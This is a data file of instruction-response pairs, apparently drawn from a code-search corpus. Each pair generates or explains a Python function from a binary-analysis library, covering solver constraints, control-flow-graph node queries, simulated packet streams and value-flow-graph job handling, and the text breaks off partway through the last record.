{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn True if e is a concrete value or is a value set with only 1 possible value.", "response": "def single_valued(self, e):\n        \"\"\"\n        Returns True whether `e` is a concrete value or is a value set with\n        only 1 possible value. This differs from `unique` in that this *does*\n        not query the constraint solver.\n        \"\"\"\n        if self.state.mode == 'static':\n            if type(e) in (int, bytes, float, bool):\n                return True\n            else:\n                return e.cardinality <= 1\n\n        else:\n            # All symbolic expressions are not single-valued\n            return not self.symbolic(e)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nsimplify the state of this object.", "response": "def simplify(self, e=None):\n        \"\"\"\n        Simplifies `e`. If `e` is None, simplifies the constraints of this\n        state.\n        \"\"\"\n        if e is None:\n            return self._solver.simplify()\n        elif isinstance(e, (int, float, bool)):\n            return e\n        elif isinstance(e, claripy.ast.Base) and e.op in claripy.operations.leaf_operations_concrete:\n            return e\n        elif isinstance(e, SimActionObject) and e.op in claripy.operations.leaf_operations_concrete:\n            return e.ast\n        elif not isinstance(e, (SimActionObject, claripy.ast.Base)):\n            return e\n        else:\n            return self._claripy_simplify(e)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd a preconstraint that variable == value to the state.", "response": "def preconstrain(self, value, variable):\n        \"\"\"\n        Add a preconstraint that ``variable == value`` to the state.\n\n        :param value:       The concrete value. Can be a bitvector or a bytestring or an integer.\n        :param variable:    The BVS to preconstrain.\n        \"\"\"\n        if not isinstance(value, claripy.ast.Base):\n            value = self.state.solver.BVV(value, len(variable))\n        elif value.op != 'BVV':\n            raise ValueError(\"Passed a value to preconstrain that was not a BVV or a string\")\n\n        if variable.op not in claripy.operations.leaf_operations:\n            l.warning(\"The variable %s to preconstrain is not a leaf AST. This may cause replacement failures in the \"\n                      \"claripy replacement backend.\", variable)\n            l.warning(\"Please use a leaf AST as the preconstraining variable instead.\")\n\n        constraint = variable == value\n        l.debug(\"Preconstraint: %s\", constraint)\n\n        # add the constraint for reconstraining later\n        self.variable_map[next(iter(variable.variables))] = constraint\n        self.preconstraints.append(constraint)\n        if o.REPLACEMENT_SOLVER in self.state.options:\n            self.state.solver._solver.add_replacement(variable, value, invalidate_cache=False)\n        else:\n            self.state.add_constraints(*self.preconstraints)\n        if not self.state.satisfiable():\n            l.warning(\"State went unsat while adding preconstraints\")"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nremoving the preconstraints from the state.", "response": "def remove_preconstraints(self, to_composite_solver=True, simplify=True):\n        \"\"\"\n        Remove the preconstraints from the state.\n\n        If you are using the zen plugin, this will also use that to filter the constraints.\n\n        :param to_composite_solver:     Whether to convert the replacement solver to a composite solver. You probably\n                                        want this if you're switching from tracing to symbolic analysis.\n        :param simplify:                Whether to simplify the resulting set of constraints.\n        \"\"\"\n        if not self.preconstraints:\n            return\n\n        # cache key set creation\n        precon_cache_keys = set()\n\n        for con in self.preconstraints:\n            precon_cache_keys.add(con.cache_key)\n\n        # if we used the replacement solver we didn't add constraints we need to remove so keep all constraints\n        if o.REPLACEMENT_SOLVER in self.state.options:\n            new_constraints = self.state.solver.constraints\n        else:\n            new_constraints = list(filter(lambda x: x.cache_key not in precon_cache_keys, self.state.solver.constraints))\n\n\n        if self.state.has_plugin(\"zen_plugin\"):\n            new_constraints = self.state.get_plugin(\"zen_plugin\").filter_constraints(new_constraints)\n\n        if to_composite_solver:\n            self.state.options.discard(o.REPLACEMENT_SOLVER)\n            self.state.options.add(o.COMPOSITE_SOLVER)\n\n        # clear the solver's internal memory and replace it with the new solver options and constraints\n        self.state.solver.reload_solver(new_constraints)\n\n        if simplify:\n            l.debug(\"simplifying solver...\")\n            self.state.solver.simplify()\n            l.debug(\"...simplification done\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef reconstrain(self):\n\n        # test all solver splits\n        subsolvers = self.state.solver._solver.split()\n\n        for solver in subsolvers:\n            solver.timeout = 1000 * 10  # 10 seconds\n            if not solver.satisfiable():\n                for var in solver.variables:\n                    if var in self.variable_map:\n                        self.state.solver.add(self.variable_map[var])\n                    else:\n                        l.warning(\"var %s not found in self.variable_map\", var)", "response": "Split the solver and re - add any preconstraints associated with each of the variables."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_ref(self, ref):\n\n        self.refs[ref.insn_addr].append(ref)\n        self.data_addr_to_ref[ref.memory_data.addr].append(ref)", "response": "Adds a reference to a memory data object."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets an arbitrary CFGNode from the segment tree.", "response": "def get_any_node(self, addr, is_syscall=None, anyaddr=False, force_fastpath=False):\n        \"\"\"\n        Get an arbitrary CFGNode (without considering their contexts) from our graph.\n\n        :param int addr:        Address of the beginning of the basic block. Set anyaddr to True to support arbitrary\n                                address.\n        :param bool is_syscall: Whether you want to get the syscall node or any other node. This is due to the fact that\n                                syscall SimProcedures have the same address as the targer it returns to.\n                                None means get either, True means get a syscall node, False means get something that isn't\n                                a syscall node.\n        :param bool anyaddr:    If anyaddr is True, then addr doesn't have to be the beginning address of a basic\n                                block. By default the entire graph.nodes() will be iterated, and the first node\n                                containing the specific address is returned, which is slow. If you need to do many such\n                                queries, you may first call `generate_index()` to create some indices that may speed up the\n                                query.\n        :param bool force_fastpath: If force_fastpath is True, it will only perform a dict lookup in the _nodes_by_addr\n                                    dict.\n        :return: A CFGNode if there is any that satisfies given conditions, or None otherwise\n        \"\"\"\n\n        # fastpath: directly look in the nodes list\n        if not anyaddr:\n            try:\n                return self._nodes_by_addr[addr][0]\n            except (KeyError, IndexError):\n                pass\n\n        if force_fastpath:\n            return None\n\n        # slower path\n        #if self._node_lookup_index is not None:\n        #    pass\n\n        # the slowest path\n        # try to show a warning first\n        # TODO: re-enable it once the segment tree is implemented\n        #if self._node_lookup_index_warned == False:\n        #    l.warning('Calling get_any_node() with anyaddr=True is slow on large programs. '\n        #              'For better performance, you may first call generate_index() to generate some indices that may '\n        #              'speed the node lookup.')\n        #    self._node_lookup_index_warned = True\n\n        for n in self.graph.nodes():\n            if self.ident == \"CFGEmulated\":\n                cond = n.looping_times == 0\n            else:\n                cond = True\n            if anyaddr and n.size is not None:\n                cond = cond and n.addr <= addr < n.addr + n.size\n            else:\n                cond = cond and (addr == n.addr)\n            if cond:\n                if is_syscall is None:\n                    return n\n                if n.is_syscall == is_syscall:\n                    return n\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting all CFGNodes whose address is the specified one.", "response": "def get_all_nodes(self, addr, is_syscall=None, anyaddr=False):\n        \"\"\"\n        Get all CFGNodes whose address is the specified one.\n\n        :param addr:       Address of the node\n        :param is_syscall: True returns the syscall node, False returns the normal CFGNode, None returns both\n        :return:           all CFGNodes\n        \"\"\"\n        results = [ ]\n\n        for cfg_node in self.graph.nodes():\n            if cfg_node.addr == addr or (anyaddr and\n                                         cfg_node.size is not None and\n                                         cfg_node.addr <= addr < (cfg_node.addr + cfg_node.size)\n                                         ):\n                if is_syscall and cfg_node.is_syscall:\n                    results.append(cfg_node)\n                elif is_syscall is False and not cfg_node.is_syscall:\n                    results.append(cfg_node)\n                else:\n                    results.append(cfg_node)\n\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a list of predecessors of a CFGNode.", "response": "def get_predecessors(self, cfgnode, excluding_fakeret=True, jumpkind=None):\n        \"\"\"\n        Get predecessors of a node in the control flow graph.\n\n        :param CFGNode cfgnode:             The node.\n        :param bool excluding_fakeret:      True if you want to exclude all predecessors that is connected to the node\n                                            with a fakeret edge.\n        :param str or None jumpkind:        Only return predecessors with the specified jumpkind. This argument will be\n                                            ignored if set to None.\n        :return:                            A list of predecessors\n        :rtype:                             list\n        \"\"\"\n\n        if excluding_fakeret and jumpkind == 'Ijk_FakeRet':\n            return [ ]\n\n        if not excluding_fakeret and jumpkind is None:\n            # fast path\n            if cfgnode in self.graph:\n                return list(self.graph.predecessors(cfgnode))\n            return [ ]\n\n        predecessors = []\n        for pred, _, data in self.graph.in_edges([cfgnode], data=True):\n            jk = data['jumpkind']\n            if jumpkind is not None:\n                if jk == jumpkind:\n                    predecessors.append(pred)\n            elif excluding_fakeret:\n                if jk != 'Ijk_FakeRet':\n                    predecessors.append(pred)\n            else:\n                predecessors.append(pred)\n        return predecessors"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_successors(self, node, excluding_fakeret=True, jumpkind=None):\n\n        if jumpkind is not None:\n            if excluding_fakeret and jumpkind == 'Ijk_FakeRet':\n                return [ ]\n\n        if not excluding_fakeret and jumpkind is None:\n            # fast path\n            if node in self.graph:\n                return list(self.graph.successors(node))\n            return [ ]\n\n        successors = []\n        for _, suc, data in self.graph.out_edges([node], data=True):\n            jk = data['jumpkind']\n            if jumpkind is not None:\n                if jumpkind == jk:\n                    successors.append(suc)\n            elif excluding_fakeret:\n                if jk != 'Ijk_FakeRet':\n                    successors.append(suc)\n            else:\n                successors.append(suc)\n        return successors", "response": "Get successors of a node in the control flow graph."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_successors_and_jumpkind(self, node, excluding_fakeret=True):\n\n        successors = []\n        for _, suc, data in self.graph.out_edges([node], data=True):\n            if not excluding_fakeret or data['jumpkind'] != 'Ijk_FakeRet':\n                successors.append((suc, data['jumpkind']))\n        return successors", "response": "Get a list of tuples where the first element is the successor of the node and the second element is the jumpkind of the successor."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets all predecessors of a specific node on the control flow graph.", "response": "def get_all_predecessors(self, cfgnode):\n        \"\"\"\n        Get all predecessors of a specific node on the control flow graph.\n\n        :param CFGNode cfgnode: The CFGNode object\n        :return: A list of predecessors in the CFG\n        :rtype: list\n        \"\"\"\n        s = set()\n        for child, parent in networkx.dfs_predecessors(self.graph, cfgnode).items():\n            s.add(child)\n            s.add(parent)\n        return list(s)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns all nodes that have an out degree > = 2", "response": "def get_branching_nodes(self):\n        \"\"\"\n        Returns all nodes that has an out degree >= 2\n        \"\"\"\n        nodes = set()\n        for n in self.graph.nodes():\n            if self.graph.out_degree(n) >= 2:\n                nodes.add(n)\n        return nodes"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the exit statement ID for control flow to reach source block from destination block.", "response": "def get_exit_stmt_idx(self, src_block, dst_block):\n        \"\"\"\n        Get the corresponding exit statement ID for control flow to reach destination block from source block. The exit\n        statement ID was put on the edge when creating the CFG.\n        Note that there must be a direct edge between the two blocks, otherwise an exception will be raised.\n\n        :return: The exit statement ID\n        \"\"\"\n\n        if not self.graph.has_edge(src_block, dst_block):\n            raise AngrCFGError('Edge (%s, %s) does not exist in CFG' % (src_block, dst_block))\n\n        return self.graph[src_block][dst_block]['stmt_idx']"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef prepare_native_return_state(native_state):\n\n        javavm_simos = native_state.project.simos\n        ret_state = native_state.copy()\n\n        # set successor flags\n        ret_state.regs._ip = ret_state.callstack.ret_addr\n        ret_state.scratch.guard = ret_state.solver.true\n        ret_state.history.jumpkind = 'Ijk_Ret'\n\n        # if available, lookup the return value in native memory\n        ret_var = ret_state.callstack.invoke_return_variable\n        if ret_var is not None:\n            # get return symbol from native state\n            native_cc = javavm_simos.get_native_cc()\n            ret_symbol = native_cc.get_return_val(native_state).to_claripy()\n            # convert value to java type\n            if ret_var.type in ArchSoot.primitive_types:\n                # return value has a primitive type\n                # => we need to manually cast the return value to the correct size, as this\n                #    would be usually done by the java callee\n                ret_value = javavm_simos.cast_primitive(ret_state, ret_symbol,\n                                                        to_type=ret_var.type)\n            else:\n                # return value has a reference type\n                # => ret_symbol is a opaque ref\n                # => lookup corresponding java reference\n                ret_value = ret_state.jni_references.lookup(ret_symbol)\n\n        else:\n            ret_value = None\n\n        # teardown return state\n        SimEngineSoot.prepare_return_state(ret_state, ret_value)\n\n        # finally, delete all local references\n        ret_state.jni_references.clear_local_references()\n\n        return [ret_state]", "response": "Prepare the state for a native function call returns."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a concretization of the contents of the file as a flat bytestring.", "response": "def concretize(self, **kwargs):\n        \"\"\"\n        Return a concretization of the contents of the file, as a flat bytestring.\n        \"\"\"\n        size = self.state.solver.min(self._size, **kwargs)\n        data = self.load(0, size)\n\n        kwargs['cast_to'] = kwargs.get('cast_to', bytes)\n        kwargs['extra_constraints'] = tuple(kwargs.get('extra_constraints', ())) + (self._size == size,)\n        return self.state.solver.eval(data, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a list of the packets read or written as bytestrings.", "response": "def concretize(self, **kwargs):\n        \"\"\"\n        Returns a list of the packets read or written as bytestrings.\n        \"\"\"\n        lengths = [self.state.solver.eval(x[1], **kwargs) for x in self.content]\n        kwargs['cast_to'] = bytes\n        return [b'' if i == 0 else self.state.solver.eval(x[0][i*self.state.arch.byte_width-1:], **kwargs) for i, x in zip(lengths, self.content)]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreads a single entry from the stream.", "response": "def read(self, pos, size, **kwargs):\n        \"\"\"\n        Read a packet from the stream.\n\n        :param int pos:     The packet number to read from the sequence of the stream. May be None to append to the stream.\n        :param size:        The size to read. May be symbolic.\n        :param short_reads: Whether to replace the size with a symbolic value constrained to less than or equal to the original size. If unspecified, will be chosen based on the state option.\n        :return:            A tuple of the data read (a bitvector of the length that is the maximum length of the read) and the actual size of the read.\n        \"\"\"\n        short_reads = kwargs.pop('short_reads', None)\n\n        # sanity check on read/write modes\n        if self.write_mode is None:\n            self.write_mode = False\n        elif self.write_mode is True:\n            raise SimFileError(\"Cannot read and write to the same SimPackets\")\n\n        # sanity check on packet number and determine if data is already present\n        if pos is None:\n            pos = len(self.content)\n        if pos < 0:\n            raise SimFileError(\"SimPacket.read(%d): Negative packet number?\" % pos)\n        elif pos > len(self.content):\n            raise SimFileError(\"SimPacket.read(%d): Packet number is past frontier of %d?\" % (pos, len(self.content)))\n        elif pos != len(self.content):\n            _, realsize = self.content[pos]\n            self.state.solver.add(size <= realsize)\n            if not self.state.solver.satisfiable():\n                raise SimFileError(\"Packet read size constraint made state unsatisfiable???\")\n            return self.content[pos] + (pos+1,)\n\n        # typecheck\n        if type(size) is int:\n            size = self.state.solver.BVV(size, self.state.arch.bits)\n\n        # The read is on the frontier. let's generate a new packet.\n        orig_size = size\n        max_size = None\n\n        # if short reads are enabled, replace size with a symbol\n        if short_reads is True or (short_reads is None and sim_options.SHORT_READS in self.state.options):\n            size = self.state.solver.BVS('packetsize_%d_%s' % (len(self.content), self.ident), self.state.arch.bits, key=('file', self.ident, 'packetsize', len(self.content)))\n            self.state.solver.add(size <= orig_size)\n\n        # figure out the maximum size of the read\n        if not self.state.solver.symbolic(size):\n            max_size = self.state.solver.eval(size)\n        elif self.state.solver.satisfiable(extra_constraints=(size <= self.state.libc.max_packet_size,)):\n            l.info(\"Constraining symbolic packet size to be less than %d\", self.state.libc.max_packet_size)\n            if not self.state.solver.is_true(orig_size <= self.state.libc.max_packet_size):\n                self.state.solver.add(size <= self.state.libc.max_packet_size)\n            if not self.state.solver.symbolic(orig_size):\n                max_size = min(self.state.solver.eval(orig_size), self.state.libc.max_packet_size)\n            else:\n                max_size = self.state.solver.max(size)\n        else:\n            max_size = self.state.solver.min(size)\n            l.warning(\"Could not constrain symbolic packet size to <= %d; using minimum %d for size\", self.state.libc.max_packet_size, max_size)\n            self.state.solver.add(size == max_size)\n\n        # generate the packet data and return it\n        data = self.state.solver.BVS('packet_%d_%s' % (len(self.content), self.ident), max_size * self.state.arch.byte_width, key=('file', self.ident, 'packet', len(self.content)))\n        packet = (data, size)\n        self.content.append(packet)\n        return packet + (pos+1,)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nwrite a packet to the stream.", "response": "def write(self, pos, data, size=None, events=True, **kwargs):\n        \"\"\"\n        Write a packet to the stream.\n\n        :param int pos:     The packet number to write in the sequence of the stream. May be None to append to the stream.\n        :param data:        The data to write, as a string or bitvector.\n        :param size:        The optional size to write. May be symbolic; must be constrained to at most the size of data.\n        :return:            The next packet to use after this\n        \"\"\"\n        if events:\n            self.state.history.add_event('fs_write', filename=self.name, data=data, size=size, pos=pos)\n\n        # sanity check on read/write modes\n        if self.write_mode is None:\n            self.write_mode = True\n        elif self.write_mode is False:\n            raise SimFileError(\"Cannot read and write to the same SimPackets\")\n\n        data = _deps_unpack(data)[0]\n        if type(data) is bytes:\n            data = claripy.BVV(data)\n        if size is None:\n            size = len(data) // self.state.arch.byte_width if isinstance(data, claripy.Bits) else len(data)\n        if type(size) is int:\n            size = self.state.solver.BVV(size, self.state.arch.bits)\n\n        # sanity check on packet number and determine if data is already present\n        if pos < 0:\n            raise SimFileError(\"SimPacket.write(%d): Negative packet number?\" % pos)\n        elif pos > len(self.content):\n            raise SimFileError(\"SimPacket.write(%d): Packet number is past frontier of %d?\" % (pos, len(self.content)))\n        elif pos != len(self.content):\n            realdata, realsize = self.content[pos]\n            maxlen = max(len(realdata), len(data))\n            self.state.solver.add(realdata[maxlen-1:0] == data[maxlen-1:0])\n            self.state.solver.add(size == realsize)\n            if not self.state.solver.satisfiable():\n                raise SimFileError(\"Packet write equality constraints made state unsatisfiable???\")\n            return pos+1\n\n        # write it out!\n        self.content.append((_deps_unpack(data)[0], size))\n        return pos+1"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreading some data from the file and stores it into memory.", "response": "def read(self, pos, size, **kwargs):\n        \"\"\"\n        Reads some data from the file, storing it into memory.\n\n        :param pos:     The address to write the read data into memory\n        :param size:    The requested length of the read\n        :return:        The real length of the read\n        \"\"\"\n        data, realsize = self.read_data(size, **kwargs)\n        if not self.state.solver.is_true(realsize == 0):\n            self.state.memory.store(pos, data, size=realsize)\n        return realsize"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwriting some data from the state memory into the file.", "response": "def write(self, pos, size, **kwargs):\n        \"\"\"\n        Writes some data, loaded from the state, into the file.\n\n        :param pos:     The address to read the data to write from in memory\n        :param size:    The requested size of the write\n        :return:        The real length of the write\n        \"\"\"\n        if type(pos) is str:\n            raise TypeError(\"SimFileDescriptor.write takes an address and size. Did you mean write_data?\")\n\n        # Find a reasonable concrete size for the load since we don't want to concretize anything\n        # This is copied from SimFile.read\n        # TODO: refactor into a generic concretization strategy?\n        if self.state.solver.symbolic(size):\n            try:\n                passed_max_size = self.state.solver.max(size, extra_constraints=(size < self.state.libc.max_packet_size,))\n            except SimSolverError:\n                passed_max_size = self.state.solver.min(size)\n                l.warning(\"Symbolic write size is too large for threshold - concretizing to min (%d)\", passed_max_size)\n                self.state.solver.add(size == passed_max_size)\n        else:\n            passed_max_size = self.state.solver.eval(size)\n            if passed_max_size > 2**13:\n                l.warning(\"Program performing extremely large write\")\n\n        data = self.state.memory.load(pos, passed_max_size)\n        return self.write_data(data, size, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a concretization of the underlying files as a tuple of read file and write file.", "response": "def concretize(self, **kwargs):\n        \"\"\"\n        Return a concretization of the underlying files, as a tuple of (read file, write file).\n        \"\"\"\n        return (self._read_file.concretize(**kwargs), self._write_file.concretize(**kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfind a sinkhole which can hold length bytes.", "response": "def get_max_sinkhole(self, length):\n        \"\"\"\n        Find a sinkhole which is large enough to support `length` bytes.\n\n        This uses first-fit. The first sinkhole (ordered in descending order by their address)\n        which can hold `length` bytes is chosen. If there are more than `length` bytes in the\n        sinkhole, a new sinkhole is created representing the remaining bytes while the old\n        sinkhole is removed.\n        \"\"\"\n\n        ordered_sinks = sorted(list(self.sinkholes), key=operator.itemgetter(0), reverse=True)\n        max_pair = None\n        for addr, sz in ordered_sinks:\n            if sz >= length:\n                max_pair = (addr, sz)\n                break\n\n        if max_pair is None:\n            return None\n\n        remaining = max_pair[1] - length\n        max_addr = max_pair[0] + remaining\n        max_length = remaining\n\n        self.sinkholes.remove(max_pair)\n\n        if remaining:\n            self.sinkholes.add((max_pair[0], max_length))\n\n        return max_addr"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nappends a new state to this VFGNode.", "response": "def append_state(self, s, is_widened_state=False):\n        \"\"\"\n        Appended a new state to this VFGNode.\n        :param s: The new state to append\n        :param is_widened_state: Whether it is a widened state or not.\n        \"\"\"\n\n        if not is_widened_state:\n            self.all_states.append(s)\n            self.state = s\n\n        else:\n            self.widened_state = s"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the first FunctionAnalysis task in the stack or None if there isn t any.", "response": "def _top_function_analysis_task(self):\n        \"\"\"\n        Get the first FunctionAnalysis task in the stack.\n\n        :return: The top function analysis task in the stack, or None if there isn't any.\n        :rtype: FunctionAnalysis\n        \"\"\"\n\n        for r in reversed(self._task_stack):\n            if isinstance(r, FunctionAnalysis):\n                return r\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_any_node(self, addr):\n        for n in self.graph.nodes():\n            if n.addr == addr:\n                return n", "response": "Get any VFG node corresponding to the basic block at addr."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _pre_analysis(self):\n\n        l.debug(\"Starting from %#x\", self._start)\n\n        # initialize the task stack\n        self._task_stack = [ ]\n\n        # initialize the execution counter dict\n        self._execution_counter = defaultdict(int)\n\n        # Generate a CFG if no CFG is provided\n        if not self._cfg:\n            l.debug(\"Generating a CFG, since none was given...\")\n            # TODO: can we use a fast CFG instead? note that fast CFG does not care of context sensitivity at all, but\n            # TODO: for state merging, we also don't really care about context sensitivity.\n            self._cfg = self.project.analyses.CFGEmulated(context_sensitivity_level=self._context_sensitivity_level,\n                starts=(self._start,)\n            )\n\n        if not self._cfg.normalized:\n            l.warning(\"The given CFG is not normalized, which might impact the performance/accuracy of the VFG \"\n                      \"analysis.\")\n\n        # Prepare the state\n        initial_state = self._prepare_initial_state(self._start, self._initial_state)\n        initial_state.ip = self._start\n\n        if self.project.arch.name.startswith('MIPS'):\n            initial_state.regs.t9 = self._start\n\n        # clear function merge points cache\n        self._function_merge_points = {}\n\n        # Create the initial state\n        state = initial_state.copy()\n\n        if self._start_at_function:\n            # set the return address to an address so we can catch it and terminate the VSA analysis\n            # TODO: Properly pick an address that will not conflict with any existing code and data in the program\n            self._final_address = 0x4fff0000\n            self._set_return_address(state, self._final_address)\n\n        call_stack = None\n        if not self._start_at_function:\n            # we should build a custom call stack\n            call_stack = CallStack()\n            call_stack = call_stack.call(None, self._function_start, retn_target=self._final_address)\n\n        job = VFGJob(state.addr, state, self._context_sensitivity_level,\n                     jumpkind='Ijk_Boring', final_return_address=self._final_address,\n                     call_stack=call_stack\n                     )\n        block_id = BlockID.new(state.addr, job.get_call_stack_suffix(), job.jumpkind)\n        job._block_id = block_id\n\n        self._insert_job(job)\n\n        # create the task\n        function_analysis_task = FunctionAnalysis(self._function_start, self._final_address)\n        function_analysis_task.jobs.append(job)\n        self._task_stack.append(function_analysis_task)", "response": "Called before the analysis starts."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the sorting key of a VFGJob instance.", "response": "def _job_sorting_key(self, job):\n        \"\"\"\n        Get the sorting key of a VFGJob instance.\n\n        :param VFGJob job: the VFGJob object.\n        :return: An integer that determines the order of this job in the queue.\n        :rtype: int\n        \"\"\"\n\n        MAX_BLOCKS_PER_FUNCTION = 1000000\n\n        task_functions = list(reversed(\n            list(task.function_address for task in self._task_stack if isinstance(task, FunctionAnalysis))\n            ))\n        try:\n            function_pos = task_functions.index(job.func_addr)\n        except ValueError:\n            # not in the list\n            # it might be because we followed the wrong path, or there is a bug in the traversal algorithm\n            # anyways, do it first\n            l.warning('Function address %#x is not found in task stack.', job.func_addr)\n            return 0\n\n        try:\n            block_in_function_pos = self._ordered_node_addrs(job.func_addr).index(job.addr)\n        except ValueError:\n            # block not found. what?\n            block_in_function_pos = min(job.addr - job.func_addr, MAX_BLOCKS_PER_FUNCTION - 1)\n\n        return block_in_function_pos + MAX_BLOCKS_PER_FUNCTION * function_pos"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _pre_job_handling(self, job):\n\n        # did we reach the final address?\n        if self._final_address is not None and job.addr == self._final_address:\n            # our analysis should be termianted here\n            l.debug(\"%s is viewed as a final state. Skip.\", job)\n            raise AngrSkipJobNotice()\n\n        l.debug(\"Handling VFGJob %s\", job)\n\n        if not self._top_task:\n            l.debug(\"No more tasks available. Skip the job.\")\n            raise AngrSkipJobNotice()\n\n        assert isinstance(self._top_task, FunctionAnalysis)\n\n        if job not in self._top_task.jobs:\n            # it seems that all jobs of the top task has been done. unwind the task stack\n            # make sure this job is at least recorded somewhere\n            unwind_count = None\n            for i, task in enumerate(reversed(self._task_stack)):\n                if isinstance(task, FunctionAnalysis):\n                    if job in task.jobs:\n                        # nice\n                        unwind_count = i\n\n            if unwind_count is None:\n                l.debug(\"%s is not recorded. Skip the job.\", job)\n                raise AngrSkipJobNotice()\n            else:\n                # unwind the stack till the target, unless we see any pending jobs for each new top task\n                for i in range(unwind_count):\n                    if isinstance(self._top_task, FunctionAnalysis):\n                        # are there any pending job belonging to the current function that we should handle first?\n                        pending_job_key = self._get_pending_job(self._top_task.function_address)\n                        if pending_job_key is not None:\n                            # ah there is\n                            # analyze it first\n                            self._trace_pending_job(pending_job_key)\n                            l.debug(\"A pending job is found for function %#x. Delay %s.\",\n                                    self._top_task.function_address, job)\n                            raise AngrDelayJobNotice()\n\n                    task = self._task_stack.pop()\n\n                    if not task.done:\n                        l.warning(\"Removing an unfinished task %s. Might be a bug.\", task)\n\n                assert job in self._top_task.jobs\n\n        # check if this is considered to be a final state\n        if self._final_state_callback is not None and self._final_state_callback(job.state, job.call_stack):\n            l.debug(\"%s.state is considered as a final state. Skip the job.\", job)\n            self.final_states.append(job.state)\n            raise AngrSkipJobNotice()\n\n        # increment the execution counter\n        self._execution_counter[job.addr] += 1\n\n        self._top_task.jobs.remove(job)\n\n        # set up some essential variables and parameters\n        job.call_stack_suffix = job.get_call_stack_suffix()\n        job.jumpkind = 'Ijk_Boring' if job.state.history.jumpkind is None else \\\n            job.state.history.jumpkind\n\n        src_block_id = job.src_block_id\n        src_exit_stmt_idx = job.src_exit_stmt_idx\n\n        addr = job.state.solver.eval(job.state.regs.ip)\n        input_state = job.state\n        block_id = BlockID.new(addr, job.call_stack_suffix, job.jumpkind)\n\n        if self._tracing_times[block_id] > self._max_iterations:\n            l.debug('%s has been traced too many times. Skip', job)\n            raise AngrSkipJobNotice()\n\n        self._tracing_times[block_id] += 1\n\n        if block_id not in self._nodes:\n            vfg_node = VFGNode(addr, block_id, state=input_state)\n            self._nodes[block_id] = vfg_node\n\n        else:\n            vfg_node = self._nodes[block_id]\n\n        job.vfg_node = vfg_node\n        # log the current state\n        vfg_node.state = input_state\n\n        # Execute this basic block with input state, and get a new SimSuccessors instance\n        # unused result var is `error_occured`\n        job.sim_successors, _, restart_analysis = self._get_simsuccessors(input_state, addr)\n\n        if restart_analysis:\n            # We should restart the analysis because of something must be changed in the very initial state\n            raise AngrVFGRestartAnalysisNotice()\n\n        if job.sim_successors is None:\n            # Ouch, we cannot get the SimSuccessors for some reason\n            # Skip this guy\n            l.debug('Cannot create SimSuccessors for %s. Skip.', job)\n            raise AngrSkipJobNotice()\n\n        self._graph_add_edge(src_block_id,\n                             block_id,\n                             jumpkind=job.jumpkind,\n                             src_exit_stmt_idx=src_exit_stmt_idx\n                             )", "response": "This function is called before actually processing the job."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _handle_successor(self, job, successor, all_successors):\n\n        # Initialize parameters\n        addr = job.addr\n        jumpkind = successor.history.jumpkind\n\n        #\n        # Get instruction pointer\n        #\n\n        if job.is_return_jump:\n            ret_target = job.call_stack.current_return_target\n            if ret_target is None:\n                # We have no where to go according to our call stack. However, the callstack might be corrupted\n                l.debug(\"According to the call stack, we have nowhere to return to.\")\n                return [ ]\n\n            successor.ip = ret_target\n\n        # this try-except block is to handle cases where the instruction pointer is symbolic\n        try:\n            successor_addrs = successor.solver.eval_upto(successor.ip, 2)\n        except SimValueError:\n            # TODO: Should fall back to reading targets from CFG\n            # It cannot be concretized currently. Maybe we could handle\n            # it later, maybe it just cannot be concretized\n            return [ ]\n\n        if len(successor_addrs) > 1:\n            # multiple concrete targets\n            if job.is_return_jump:\n                # It might be caused by state merging\n                # We may retrieve the correct ip from call stack\n                successor.ip = job.call_stack.current_return_target\n\n            else:\n                return self._handle_successor_multitargets(job, successor, all_successors)\n\n        # Now there should be one single target for the successor\n        successor_addr = successor.solver.eval_one(successor.ip)\n\n        # Get the fake ret successor\n        fakeret_successor = None\n        if self._is_call_jumpkind(jumpkind):\n            fakeret_successor = all_successors[-1]\n\n            # If the function we're calling into doesn't return, we should discard it\n            if self._cfg is not None:\n                func = self.kb.functions.function(addr=job.call_target)\n                if func is not None and func.returning is False and len(all_successors) == 2:\n                    del all_successors[-1]\n                    fakeret_successor = None\n\n        if self._is_call_jumpkind(jumpkind):\n            # Create a new call stack for the successor\n            new_call_stack = self._create_callstack(job, successor_addr, jumpkind, fakeret_successor)\n            if new_call_stack is None:\n                